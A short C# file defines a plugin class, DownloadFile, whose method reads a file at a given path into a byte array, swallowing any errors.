using System.IO;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class DownloadFile
    {
        internal static byte[] ReadFile(string path)
        {
            byte[] result = null;
            try
            {
                FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
                result = new byte[fs.Length];
                fs.Read(result, 0, (int)fs.Length);
                fs.Close();
                fs.Dispose();
            }
            catch { }
            return result;
        }
    }
}
